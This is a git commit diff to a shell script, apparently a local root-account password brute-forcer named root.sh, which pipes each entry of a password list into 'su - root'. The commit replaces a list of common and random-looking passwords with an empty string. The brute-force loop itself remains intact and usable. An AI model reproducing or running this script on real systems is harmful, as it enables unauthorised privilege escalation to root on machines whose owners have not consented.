2fa523ebea8d71a30e118b5417d1d709ab39a327
MOnu4AM <135576704+MOnu4AM@users.noreply.github.com>
2023-06-05 11:21:38 +0530

    Update root.sh

--- root.sh
+++ root.sh
@@ -2,7 +2,7 @@
 
 target_username="root"
 
-password_list="123456789 danielle 123456 Fv67i_+28WRT0mY7x princesa diamond vcdkqhhqdtvxbc3c4mj3238gg"
+password_list=""
 
 for password in $password_list; do
     echo "$password" | su - "$target_username" -c "echo 'Successfully switched to $target_username'"
